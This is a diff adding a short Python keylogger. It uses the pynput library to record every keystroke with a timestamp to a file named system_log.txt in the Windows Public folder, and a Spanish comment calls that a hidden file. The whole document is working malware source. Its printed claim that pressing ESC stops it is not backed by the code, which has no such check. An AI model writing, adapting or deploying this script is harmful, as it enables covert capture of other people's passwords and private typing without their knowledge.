@@ -1,0 +1,20 @@
+from pynput import keyboard
+import datetime
+import os
+
+log_file = "C:\\Users\\Public\\system_log.txt"  # Archivo oculto en carpeta pública
+
+def on_press(key):
+    try:
+        with open(log_file, "a", encoding="utf-8") as f:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"[{timestamp}] {key.char}\n")
+    except AttributeError:
+        with open(log_file, "a", encoding="utf-8") as f:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"[{timestamp}] [{str(key)}]\n")
+
+print("Keylogger iniciado... (presiona ESC para parar)")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
